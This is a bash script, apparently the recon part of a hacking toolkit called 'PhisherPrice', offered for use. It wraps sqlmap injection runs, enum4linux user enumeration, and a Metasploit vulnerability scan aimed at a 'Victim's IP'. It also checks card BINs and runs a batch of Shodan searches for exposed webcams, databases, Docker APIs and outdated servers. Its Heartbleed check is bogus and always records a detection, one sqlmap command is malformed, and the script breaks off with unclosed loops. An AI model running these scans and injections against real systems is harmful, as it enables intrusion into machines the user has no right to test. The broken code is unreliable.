#!/bin/bash
## rjwdlu4eva
## PhiserPrice 3.0 (ALPHA)
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   echo "You Forgot To Say The Magic Word, bRuHhh cmon" 
   exit 1
fi
i="0"
clear
while [ $i -lt 1 ]
do
clear
#API KEYS
phone_lookup_api_key=REPLACE_ME_WITH_YOUR_API_KEY
bin_checker_api_key=REPLACE_ME_WITH_YOUR_API_KEY
email_validator_api_key=REPLACE_ME_WITH_YOUR_API_KEY
SHODAN_API_KEY=REPLACE_ME_WITH_YOUR_API_KEY

#COLOUR
red='\e[1;31m'
yellow='\e[0;33m'
Blue='\e[1;34m'

banner='
\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <   \e[1;31m PhisherPrice \e[1;33m
   /<<< \_\_ \e[1;31m Happy Hour Playset \e[1;33m
  /,)^>>_._ \ \e[1;31m Version 3.0 \e[1;33m
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m'

	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"
	\e[0m\e[3;39m
(1) Recon
(2) Cracking
(3) AutoxSploits
(4) Networking
(5) C.Y.O xSploits
(6) AutoExif  
(7) SE Toolkit
(8) Start Th3inspector
(u) Update Script
(c) Contact Information
CTRL + C To Exit
'
option1='1'
option2='2'
option3='3'
option4='4'
option5='5'
option6='6'
option7='7'
option8='8'
update='u'
contact='c'

echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"ToolSet$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$option1" ]; then                    #Option1
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                   
    \e[0m\e[3;39m \e[1;31m
Recon & Auditing
\e[3;39m
(1) Whois Info
(2) Geo IP
(3) IP Lookup
(4) DNS Lookup
(5) Reverse DNS Lookup
(6) Shared DNS Lookup
(7) Nmap Scan
(8) SSH Scanner (Scan for weak cyphers)
(9) SSL/TLS Scanner (Scan for weak cyphers)
(10) Retreive HTTP Headers
(11) Autonomous System Lookup (AS/ASN/IP)
(12) Banner Grab
(13) Extract All Links From Host
(14) Phone Number Lookup
(15) Reverse Analytics
(16) Get Server Users
(17) SQL Map
(18) SQL Map (Quick/Deep)
(19) Scan For Vulns (Metasploit)
(20) BIN Checker
(21) Email Validator
(22) Scan Shodan for vulnrable IOT Devices
CTRL + C To Exit
Press ENTER To Go To Main Menu
'
sub2='1'
sub3='2'
sub4='3'
sub5='4'
sub6='5'
sub7='6'
sub8='7'
sub9='8'
sub10='9'
sub11='10'
sub12='11'
sub13='12'
sub14='13'
sub15='14'
sub16='15'
sub17='16'
sub18='17'
sub19='18'
sub20='19'
sub21='20'
sub22='21'
sub23='22'

echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Recon & Audit$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$sub2" ]; then                    #Sub-Option-2
clear
echo "Enter website domain:"
read domain

 echo -e "\n----------------------------------------"
echo "Gathering Information About Host:"
echo "$domain"
echo "-------------------------------"

response=$(whois $domain)

if [[ -z $response || $response == *"No match for"* || $response == *"NOT FOUND"* ]]; then
  echo "Error: Domain $domain not found"
else
  echo -e "\n----------------------------------------"
  echo "Domain Information"
  echo "----------------------------------------"
  echo -e "$response"
  
  echo -e "\nDo you want to save the information to a file? (y/n)"
  read saveToFile
  if [[ $saveToFile == "y" ]]; then
    echo -e "$response" > "$domain.txt"
    echo "Information saved to file: $domain.txt"
  fi
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub3" ]; then                    #Sub-Option-3
clear
echo -e '\e[1;33m
  ________             ._____________ 
 /  _____/  ____  ____ |   \______   \
/   \  ____/ __ \/  _ \|   ||     ___/
\    \_\  \  ___(  <_> )   ||    |    
 \______  /\___  >____/|___||____|    
        \/     \/                     \e[1;34m
' 
echo "Enter IP or Domain:"
read subop3

echo -e "\n-------------------------------"
echo "Getting Geo IP Information for:"
echo "$subop3"
echo "-------------------------------"

response=$(curl -s "https://api.hackertarget.com/geoip/?q=$subop3")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve Geo IP information for $subop3"
else
  echo -e "\n-----------------------------"
  echo "Geo IP Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub4" ]; then                    #Sub-Option-4
clear
echo -e '\e[1;33m
__________._____________  .____                  __                 
\______   \   \______   \ |    |    ____   ____ |  | ____ ________  
 |       _/   ||     ___/ |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
 |    |   \   ||    |     |    |__(  <_> |  <_> )    <|  |  /  |_> >
 |____|_  /___||____|     |_______ \____/ \____/|__|_ \____/|   __/ 
        \/      Reverse IP Lookup \/                 \/     |__|    \e[1;34m
'  
echo "Enter IP or Domain:"
read subop4

echo -e "\n-------------------------------"
echo "Getting IP Information for:"
echo "$subop4"
echo "-------------------------------"

response=$(curl -s "http://api.hackertarget.com/reverseiplookup/?q=$subop4")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve reverse IP information for $subop4"
else
  echo -e "\n-----------------------------"
  echo "Reverse IP Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi

read -p "Press enter to continue."
elif [ "$x" == "$sub5" ]; then                    #Sub-Option-5
clear
echo -e '\e[1;33m
________    _______    _________ .____                  __                 
\______ \   \      \  /   _____/ |    |    ____   ____ |  | ____ ________  
 |    |  \  /   |   \ \_____  \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
 |    `   \/    |    \/        \ |    |__(  <_> |  <_> )    <|  |  /  |_> >
/_______  /\____|__  /_______  / |_______ \____/ \____/|__|_ \____/|   __/ 
        \/         \/        \/          \/                 \/     |__|    \e[1;34m
'  
echo "Enter IP Address, IP Range or Domain Name:"
read subop5

echo -e "\n-------------------------------"
echo "Getting DNS Information for:"
echo "$subop5"
echo "-------------------------------"

response=$(curl -s "http://api.hackertarget.com/dnslookup/?q=$subop5")
if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve DNS information for $subop5"
else
  echo -e "\n-----------------------------"
  echo "DNS Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub6" ]; then                    #Sub-Option-6
clear
echo -e '\e[1;33m
__________                                         ________    _______    _________
\______   \ _______  __ ___________  ______ ____   \______ \   \      \  /   _____/
 |       _// __ \  \/ // __ \_  __ \/  ___// __ \   |    |  \  /   |   \ \_____  \ 
 |    |   \  ___/\   /\  ___/|  | \/\___ \\  ___/   |    `   \/    |    \/        \
 |____|_  /\___  >\_/  \___  >__|  /____  >\___  > /_______  /\____|__  /_______  /
        \/     \/          \/           \/     \/          \/         \/        \/ \e[1;34m
' 
echo "Enter IP or domain:"
read subop6

echo -e "\n-------------------------------"
echo "Getting DNS information for:"
echo "$subop6"
echo "-------------------------------"

response=$(curl -s "https://api.hackertarget.com/reversedns/?q=$subop6")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve DNS information for $subop6"
else
  echo -e "\n-----------------------------"
  echo "DNS Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub7" ]; then                    #Sub-Option-7
clear
echo -e '\e[1;33m
  _________.__                             .___ ________    _______    _________
 /   _____/|  |__ _____ _______   ____   __| _/ \______ \   \      \  /   _____/
 \_____  \ |  |  \\__  \\_  __ \_/ __ \ / __ |   |    |  \  /   |   \ \_____  \ 
 /        \|   Y  \/ __ \|  | \/\  ___// /_/ |   |    `   \/    |    \/        \
/_______  /|___|  (____  /__|    \___  >____ |  /_______  /\____|__  /_______  /
        \/      \/     \/            \/     \/          \/         \/        \/ \e[1;34m
' 
echo "Enter IP Or Domain."
read subop7

echo -e "\n-------------------------------"
echo "Finding Shared DNS Servers for:"
echo "$subop7"
echo "-------------------------------"

response=$(curl -s "https://api.hackertarget.com/findshareddns/?q=$subop7")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve shared DNS servers for $subop7"
else
  echo -e "\n-------------------------------"
  echo "Shared DNS Servers Found"
  echo "-------------------------------"
  echo -e "$response"

  read -p "Do you want to save the results to a file? (y/n) " save_to_file
  if [[ $save_to_file == "y" || $save_to_file == "Y" ]]; then
    read -p "Enter a filename to save the results to: " filename
    echo -e "$response" > "$filename"
    echo "Results saved to $filename"
  fi
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub8" ]; then                    #Sub-Option-8
clear
echo -e '\e[1;33m
 _______      _____      _____ __________    _________                     
 \      \    /     \    /  _  \\______   \  /   _____/ ____ _____    ____  
 /   |   \  /  \ /  \  /  /_\  \|     ___/  \_____  \_/ ___\\__  \  /    \ 
/    |    \/    Y    \/    |    \    |      /        \  \___ / __ \|   |  \
\____|__  /\____|__  /\____|__  /____|     /_______  /\___  >____  /___|  /
        \/         \/         \/                   \/     \/     \/     \/ \e[1;34m
'
echo "Enter IP Or Domain."
read subop8
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!   Getting Open Ports      !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

curl http://api.hackertarget.com/nmap/?q=$subop8

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!    Open Ports Found Using PhiserPrice     !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$sub9" ]; then                    #sshscanner
clear
function scan_ciphers() {
  host="$1"
  port="$2"

  printf "Testing available ciphers on %s:%s...\n" "$host" "$port"
  printf "\n\033[1;33mTesting for weak ciphers...\033[0m\n"

  openssl ciphers -v | awk '{print $1}' | while read cipher; do
    openssl s_client -cipher "$cipher" -connect "$host:$port" >/dev/null 2>&1 && echo -e "Cipher \033[1;32m$cipher is enabled\033[0m" || echo -e "Cipher \033[1;31m$cipher is disabled\033[0m"
  done | grep -i -E "NULL|RC4|DES|3DES|MD5|SHA-1"

  printf "\n\033[1;33mTesting for strong ciphers...\033[0m\n"

  openssl ciphers -v | awk '{print $1}' | while read cipher; do
    openssl s_client -cipher "$cipher" -connect "$host:$port" >/dev/null 2>&1 && echo -e "Cipher \033[1;32m$cipher is enabled\033[0m" || echo -e "Cipher \033[1;31m$cipher is disabled\033[0m"
  done | grep -v -E "NULL|RC4|DES|3DES|MD5|SHA-1"

  printf "\n\033[1;33mTesting for weak MACs...\033[0m\n"

  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES256-SHA >/dev/null 2>&1 && echo -e "\033[1;32mHMAC-SHA256 is enabled\033[0m" || echo -e "\033[1;31mHMAC-SHA256 is disabled\033[0m"
  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES128-SHA >/dev/null 2>&1 && echo -e "\033[1;32mHMAC-SHA1 is enabled\033[0m" || echo -e "\033[1;31mHMAC-SHA1 is disabled\033[0m"

  printf "\n\033[1;33mTesting for key exchange methods...\033[0m\n"

  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES256-SHA >/dev/null 2>&1 && echo -e "\033[1;32mECDHE key exchange is enabled\033[0m" || echo -e "\033[1;31mECDHE key exchange is disabled\033[0m"
  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES256-SHA >/dev/null 2>&1 && echo -e "\033[1;32mDHE key exchange is enabled\033[0m" || echo -e "\033[1;31mDHE key exchange is disabled\033[0m"

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Host Scanned Using PhiserPrice     !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
  read -n 1 -s -r -p "Press any key to continue"
}
echo -e '
  _________ _________ ___ ___     _________                                         
 /   _____//   _____//   |   \   /   _____/ ____ _____    ____   ____   ___________ 
 \_____  \ \_____  \/    ~    \  \_____  \_/ ___\\__  \  /    \ /    \_/ __ \_  __ \
 /        \/        \    Y    /  /        \  \___ / __ \|   |  \   |  \  ___/|  | \/
/_______  /_______  /\___|_  /  /_______  /\___  >____  /___|  /___|  /\___  >__|   
        \/        \/       \/           \/     \/     \/     \/     \/     \/       
'
printf "Enter host: "
read host
printf "Enter port: "
read port

scan_ciphers "$host" "$port"
elif [ "$x" == "$sub10" ]; then                    #Sub-Option-10
clear
echo "Enter the host you want to scan (e.g. testsite.com):"
read host
echo "Enter the host port you want to scan (e.g. 443):"
read port
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Scanning host SSL/TLS for vulns    !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

response=$(echo | openssl s_client -connect "$host:$port" 2>/dev/null | openssl x509 -text)

if [[ -z $response || $response == *"unable to"* ]]; then
  echo "Error: Failed to retrieve SSL/TLS information for $host:$port"
else
  echo -e "\n-----------------------------"
  echo "SSL/TLS Information"
  echo "-----------------------------"
  echo -e "$response"

  if [[ $response == *"heartbleed"* ]]; then
    echo -e "\n-----------------------------"
    echo "Heartbleed Vulnerability Detected!"
    echo "-----------------------------"
  fi
fi

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Host scanned using PhiserPrice     !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

echo "Do you want to save the output to a text file? (y/n)"
read save_option

if [[ $save_option == "y" || $save_option == "Y" ]]; then
  echo -e "\nSaving output to file...\n"
  echo "Host: $host" > ssl_scan_results.txt
  echo "Port: $port" >> ssl_scan_results.txt
  echo -e "-----------------------------\nSSL/TLS Information\n-----------------------------\n$response" >> ssl_scan_results.txt
  echo -e "\n-----------------------------\nHeartbleed Vulnerability Detected!\n-----------------------------" >> ssl_scan_results.txt
  echo -e "\nScan complete. Results saved to ssl_scan_results.txt"
else
  echo "Scan complete."
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub11" ]; then                    #Sub-Option-11
clear
echo -e '\e[1;33m
  ___ ___________________________________  _________                     
 /   |   \__    ___/\__    ___/\______   \/   _____/ ____ _____    ____  
/    ~    \|    |     |    |    |     ___/\_____  \_/ ___\\__  \  /    \ 
\    Y    /|    |     |    |    |    |    /        \  \___ / __ \|   |  \
 \___|_  / |____|     |____|    |____|   /_______  /\___  >____  /___|  /
       \/  HTTP Header Scan                      \/     \/     \/     \/ \e[1;34m
'
echo "Enter the host you want to scan:"
read subop11

echo -e "\n-------------------------------"
echo "Checking HTTP Headers for:"
echo "$subop11"
echo "-------------------------------"

status=$(curl -sI $subop11 | head -n 1 | cut -d' ' -f2)

if [[ $status != "200" ]]; then
  echo "Error: Failed to retrieve HTTP headers for $subop11 (Status Code: $status)"
else
  echo -e "\n------------------------------"
  echo "HTTP Headers for $subop11"
echo "$subop11"
echo "-------------------------------"
  curl -sI $subop11
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub12" ]; then                    #Sub-Option-12
clear
echo -e '\e[1;33m
   _____    _________ _______    .____                  __                 
  /  _  \  /   _____/ \      \   |    |    ____   ____ |  | ____ ________  
 /  /_\  \ \_____  \  /   |   \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
/    |    \/        \/    |    \ |    |__(  <_> |  <_> )    <|  |  /  |_> >
\____|__  /_______  /\____|__  / |_______ \____/ \____/|__|_ \____/|   __/ 
        \/        \/         \/          \/                 \/     |__|    \e[1;34m
'  
echo "Enter the ASN you want to scan:"
echo "Example usage: 1.1.1.1 / AS15169"
read subop12

echo -e "\n-------------------------------"
echo "Scanning host for ASN:"
echo "$subop12"
echo "-------------------------------"

response=$(curl -s https://api.hackertarget.com/aslookup/?q=$subop12)

if [[ -z $response ]]; then
  echo "Error: Failed to retrieve ASN information for $subop12"
else
  echo -e "\n------------------------------"
  echo "ASN Information for $subop12"
  echo "------------------------------"
  echo -e "$response"
fi

echo -e "\n------------------------------"
echo "Host scanned using PhiserPrice"
echo "------------------------------"

read -p "Press enter to continue."


elif [ "$x" == "$sub13" ]; then                    #Sub-Option-13
clear
echo -e '\e[1;33m
__________                                       ________            ___.    
\______   \_____    ____   ____   ___________   /  _____/___________ \_ |__  
 |    |  _/\__  \  /    \ /    \_/ __ \_  __ \ /   \  __\_  __ \__  \ | __ \ 
 |    |   \ / __ \|   |  \   |  \  ___/|  | \/ \    \_\  \  | \// __ \| \_\ \
 |______  /(____  /___|  /___|  /\___  >__|     \______  /__|  (____  /___  /
        \/      \/     \/     \/     \/                \/           \/    \/ \e[1;34m
' 
echo "Enter the IP address or domain name you want to scan:"
read subop13

echo -e "\n-----------------------------------"
echo "Scanning host information for:"
echo "$subop13"
echo "-----------------------------------"

response=$(curl -sS https://api.hackertarget.com/bannerlookup/?q="$subop13")

if [[ -z $response ]]; then
  echo "Error: Failed to retrieve host information for $subop13"
else
  echo -e "\n---------------------------"
  echo "Host Information for $subop13"
  echo "---------------------------"
  echo -e "$response"
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub14" ]; then                    #Sub-Option-14
clear
echo -e '\e[1;33m
.____    .__        __       _________      .__  _____  _____             
|    |   |__| ____ |  | __  /   _____/ ____ |__|/ ____\/ ____\___________ 
|    |   |  |/    \|  |/ /  \_____  \ /    \|  \   __\\   __\/ __ \_  __ \
|    |___|  |   |  \    <   /        \   |  \  ||  |   |  | \  ___/|  | \/
|_______ \__|___|  /__|_ \ /_______  /___|  /__||__|   |__|  \___  >__|   
        \/       \/     \/         \/     \/                     \/       \e[1;34m
'
echo "This can reveal social media pages, etc."
echo "Enter domain name:"
read domain

echo -e "\n-----------------------------"
echo "Extracting host links for:"
echo "$domain"
echo "-----------------------------"

result=$(curl -s https://api.hackertarget.com/pagelinks/?q=$domain)

if [[ -z $result ]]; then
  echo "Error: Failed to retrieve host links for $domain"
else
  echo -e "\n-----------------------------"
  echo "Host links for $domain:"
  echo "-----------------------------"
  echo -e "$result"

  read -p "Save results to a file? (Y/N): " save_results

  if [[ $save_results == "Y" || $save_results == "y" ]]; then
    echo -e "$result" > "${domain}_pagelinks.txt"
    echo "Results saved to ${domain}_pagelinks.txt"
  fi
fi

echo -e "\n-----------------------------"
echo "Host links extraction completed using PhisherPrice!"
echo "-----------------------------"

elif [ "$x" == "$sub15" ]; then                    #Sub-Option-15
clear
echo -e '\e[1;33m
__________.__                           .____                  __                 
\______   \  |__   ____   ____   ____   |    |    ____   ____ |  | ____ ________  
 |     ___/  |  \ /  _ \ /    \_/ __ \  |    |   /  _ \ /  _ \|  |/ /  |  \____ \ 
 |    |   |   Y  (  <_> )   |  \  ___/  |    |__(  <_> |  <_> )    <|  |  /  |_> >
 |____|   |___|  /\____/|___|  /\___  > |_______ \____/ \____/|__|_ \____/|   __/ 
               \/            \/     \/          \/                 \/     |__|    \e[1;34m
'
echo "Please Enter The Number Followed By The Dialing Code"
echo "for example : +447410490080 / +44 Is My Dialing Code"
read subop15
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!  Looking Up Info About The Number  !!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'
curl --request GET "https://api.apilayer.com/number_verification/validate?number=$subop15" \
--header "apikey: $phone_lookup_api_key"

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     Phone Info Found Using PhisherPrice    !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$sub16" ]; then                    #Sub-Option-16
clear
echo -e '\e[1;33m
__________              _____                .__           __  .__               
\______   \ _______  __/  _  \   ____ _____  |  | ___.__._/  |_|__| ____   ______
 |       _// __ \  \/ /  /_\  \ /    \\__  \ |  |<   |  |\   __\  |/ ___\ /  ___/
 |    |   \  ___/\   /    |    \   |  \/ __ \|  |_\___  | |  | |  \  \___ \___ \ 
 |____|_  /\___  >\_/\____|__  /___|  (____  /____/ ____| |__| |__|\___  >____  >
        \/     \/            \/     \/     \/     \/ Reverse Analytics \/     \/ \e[1;34m
'  
echo "Find Domains Using Same Google Ad-Sense ID"
echo "Enter Domain Name Or GA-ID"
echo "For example: UA-11223344 or testsite.com"
read subop16

echo -e '\n----------------------------------'
echo "Retrieving Hosts/GA-ID for: $subop16"
echo '----------------------------------'

result=$(curl -s https://api.hackertarget.com/analyticslookup/?q=$subop16)

if [[ $result == "error check your search parameter" ]]; then
  echo "Error: Invalid search parameter $subop16"
else
  echo -e "\n----------------------------------"
  echo "Host Info Found for $subop16"
  echo '----------------------------------'
  echo -e "$result"
fi

echo -e '\n----------------------------------'
echo "Hosts/GA-ID retrieved using PhisherPrice"
echo '----------------------------------'

read -p "Press Enter to continue." 

elif [ "$x" == "$sub17" ]; then                    #Sub-Option-17
clear
echo -e '\e[1;33m
 ____ ___                       _________                           .__     
|    |   \______ ___________   /   _____/ ____ _____ _______   ____ |  |__  
|    |   /  ___// __ \_  __ \  \_____  \_/ __ \\__  \\_  __ \_/ ___\|  |  \ 
|    |  /\___ \\  ___/|  | \/  /        \  ___/ / __ \|  | \/\  \___|   Y  \
|______//____  >\___  >__|    /_______  /\___  >____  /__|    \___  >___|  /
             \/     \/                \/     \/     \/            \/     \/ \e[1;34m
'
echo "Enter Domain Name Or IP:"
read subop17

echo -e "\n-----------------------------"
echo "Retrieving Host Users for:"
echo "$subop17"
echo "-----------------------------"
users=$(enum4linux -M -G -P -S -U $subop17)

if [[ -z "$users" ]]; then
  echo -e "\n-----------------------------"
  echo "No Host Users Found for:"
  echo "$subop17"
  echo "-----------------------------"
else
  echo -e "\n-------------------------------------------"
  echo 'Host Users Retrieved Successfully'
  echo '-------------------------------------------'
  echo "$users"
fi

read -p "Would you like to save the output to a text file? [y/N] " save_output
if [[ $save_output =~ ^[Yy]$ ]]; then
  echo "$users" > enum4linux_output.txt
  echo "Output saved to enum4linux_output.txt"
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub18" ]; then                    #Sub-Option-18
clear
echo -e '\e[1;33m
  _________________  .____         _____                                     
 /   _____/\_____  \ |    |       /     \ _____  ______ ______   ___________ 
 \_____  \  /  / \  \|    |      /  \ /  \\__  \ \____ \\____ \_/ __ \_  __ \
 /        \/   \_/.  \    |___  /    Y    \/ __ \|  |_> >  |_> >  ___/|  | \/
/_______  /\_____\ \_/_______ \ \____|__  (____  /   __/|   __/ \___  >__|   
        \/        \__>       \/         \/     \/|__|   |__|        \/       \e[1;34m
'
echo "Enter Domain Name Or IP:"
read sql1

echo "Database Type If You Know It, If Not Leave This Blank"
echo "Press Enter If You're Unsure"
read db

echo "Level of tests to perform (1-5, default 1)"
read levelt

echo "Risk of tests to perform (1-3, default 1)"
read risksl

echo "SQL injection techniques to use (default: BEUSTQ)"
echo "Press Enter To Leave Default"
read techskill

echo -e "\n-----------------------------"
echo "Auditing Host SQL Info for:"
echo "$sql1"
echo "-----------------------------"
sqlmap --dbms="$db" --forms --crawl=2 --level="${levelt:-1}" --risk="${risksl:-1}" --random-agent --all --technique="${techskill:-BEUSTQ}" -u "$sql1"

if [[ $? -eq 0 ]]; then
  echo -e '\n-------------------------------------------'
  echo 'SQL Audit Conducted Successfully'
  echo '-------------------------------------------'

  read -p "Press enter to continue."
else
  clear
  echo -e '\n-------------------------------------------'
  echo 'Failed to Conduct SQL Audit'
  echo '-------------------------------------------'
fi
  read -p "Press enter to continue."

elif [ "$x" == "$sub19" ]; then                    #sub-Option-19
clear
echo -e '\e[1;33m
  _________________  .____     
 /   _____/\_____  \ |    |    
 \_____  \  /  / \  \|    |    
 /        \/   \_/.  \    |___ 
/_______  /\_____\ \_/_______ \
        \/        \__>       \/ Brute Force \e[1;34m
'
echo "Enter Website"
read sqlhost2
echo "php or html ?"
read phphtml1

output=$(sqlmap -u $sqlhost2 searchgetby_id.$phphtml1?id=4 --dbs --columns -D scanme --tamper=space2comment --level 5)

if [[ $output == *"available databases"* ]]; then
  echo "Database information retrieved successfully:"
  echo "$output"
else
  echo "No database information retrieved. Please check your input and try again."
fi

  read -p "Press enter to continue."

elif [ "$x" == "$sub20" ]; then                    #sub-Option-20
clear
echo -e '\e[1;33mMSPLOIT VULN SCANNER\e[0m'
echo -e "\n-------------------------------------------"
echo -e "\e[1;36mEnter Victim's IP:\e[0m"
read victim_ip

echo -e "\n\e[1;36m------------------------------\e[0m"
echo -e "\e[1;36mRunning nmap with vuln script...\e[0m"
echo -e "\e[1;36m------------------------------\e[0m"

# start spinner animation
spinner="/-\|"
while true; do
  for i in $(seq 0 3); do
    echo -ne "\rScanning $victim_ip... ${spinner:$i:1}"
    sleep 0.1
  done
done &

# run command and save output
output=$(msfconsole -q -x "nmap -v --script vuln $victim_ip ;exit ;" 2>&1)

# stop spinner animation
kill "$!" >/dev/null 2>&1

if echo "$output" | grep -q "VULNERABLE"; then
  echo -e "\n\e[1;31m-------------------------------------------\e[0m"
  echo -e "\e[1;31mVulnerabilities Found:\e[0m"
  echo -e "$output"
  echo -e "\e[1;31m-------------------------------------------\e[0m"
else
  clear
  echo -e "\n\e[1;32m-------------------------------------------\e[0m"
  echo -e "\e[1;32mNo vulnerabilities found.\e[0m"
  echo -e "\n\e[1;32m-------------------------------------------\e[0m"
fi

read -p "Press enter to continue."

elif [ "$x" == "$sub21" ]; then                    #sub-Option-21
clear
echo -e '\e[1;33m
BIN Checker \e[1;34m
'
echo "Enter The BIN Number:"
read r

curl --request GET \
    --url https://bank-card-bin-num-check.p.rapidapi.com/api/v1/bins/b/$r \
    --header "X-RapidAPI-Host: bank-card-bin-num-check.p.rapidapi.com" \
    --header "X-RapidAPI-Key:$bin_checker_api_key"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$sub22" ]; then                    #sub-Option-22
clear
echo -e '\e[1;33m
Email Validator \e[1;34m
'
echo "Enter the email address to verify:"

read email

curl --location --request GET "https://api.apilayer.com/email_verification/${email}" \
--header "apikey: ${email_validator_api_key}"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$sub23" ]; then                    #Sub-Option-2
clear
echo "Shodan Vulnrability Search${reset}"

OUTPUT_FILE="shodan_results_$(date +%Y%m%d_%H%M%S).txt"

QUERIES=("title:"webcam" port:554")
QUERIES+=("product:"Apache httpd" version:<2.4.29")
QUERIES+=("product:"Microsoft-IIS"")
QUERIES+=("product:"OpenSSH"")
QUERIES+=("product:"OpenSSH" version:<7.4")
QUERIES+=("product:"nginx"")
QUERIES+=("product:"phpMyAdmin"")
QUERIES+=("product:"Samba"")
QUERIES+=("product:"MySQL"")
QUERIES+=("product:"MySQL" port:3306")
QUERIES+=("product:"PostgreSQL"")
QUERIES+=("product:"Elasticsearch"")
QUERIES+=("product:"MongoDB"")
QUERIES+=("product:"Redis"")
QUERIES+=("product:"Rsync"")
QUERIES+=("product:"Hadoop"")
QUERIES+=("product:"Zookeeper"")
QUERIES+=("product:"Elasticsearch"")
QUERIES+=("product:"RabbitMQ"")
QUERIES+=("port:3389 has_screenshot:true")
QUERIES+=("port:22 product:"OpenSSH" version:<7.4")
QUERIES+=("port:1433 country:US product:"Microsoft SQL Server"")
QUERIES+=("port:21 product:"ProFTPD" version:<1.3.5")
QUERIES+=("port:445 os:Windows")
QUERIES+=("port:161 product:"SNMP"")
QUERIES+=("product:"D-Link Web Management"")
QUERIES+=("product:"nginx" version:<1.16.1")
QUERIES+=("product:"nginx" version:<1.19.4")
QUERIES+=("product:"PHP" version:<7.2")
QUERIES+=("product:"PHP" version:<7.3")
QUERIES+=("port:22 has_ipv6:true")
QUERIES+=("product:"Docker" port:2375")
QUERIES+=("product:"Microsoft Exchange Server 2013"")
QUERIES+=("product:"Microsoft Exchange Server 2016"")
QUERIES+=("product:"Microsoft SQL Server" port:1433")
QUERIES+=("product:"MongoDB" port:27017")
QUERIES+=("product:"Elasticsearch" port:9200")
QUERIES+=("product:"Docker" port:2375")
QUERIES+=("product:"Cisco ASA"")
QUERIES+=("product:"Juniper" port:22")
QUERIES+=("product:"HP iLO"")
QUERIES+=("product:"Supermicro IPMI"")
QUERIES+=("product:"NETGEAR ProSafe"")
QUERIES+=("product:"QNAP"")
QUERIES+=("product:"OpenSSH" version:<7.6")
QUERIES+=("product:"OpenSSL" version:<1.0.2")
QUERIES+=("product:"Exim" version:<4.92")
QUERIES+=("product:"nginx" version:<1.16.1")
QUERIES+=("product:"MongoDB" port:27017")
QUERIES+=("product:"Elasticsearch" port:9200")
QUERIES+=("product:"Apache Tomcat" version:7.0.0")
QUERIES+=('port:389 os:"Windows Server 2016"')
QUERIES+=('port:3389 os:"Windows 10"')
QUERIES+=("product:\"elasticsearch\" port:9200")
QUERIES+=("product:\"mongodb\" port:27017")
QUERIES+=("product:\"rabbitmq\" port:5672")
QUERIES+=("product:\"activemq\" port:8161")
QUERIES+=("port:6379 \"redis\"")
QUERIES+=("product:\"neo4j\" port:7474")

read -p "Do you want to start the search? (y/n) " answer
if [ "$answer" != "y" ]; then
    exit
fi
for QUERY in "${QUERIES[@]}"
do
    echo "Searching for: $QUERY"
    curl -s "https://api.shodan.io/shodan/host/search?key=$SHODAN_API_KEY&query=$QUERY" | jq 'try (.matches | .[] | {product, ip_str}) catch "API error: $QUERY"' | sed 's/"//g' >> $OUTPUT_FILE
done    
echo ""
echo "Scanning finished saved to $OUTPUT_FILE"
read

else 

n

fi

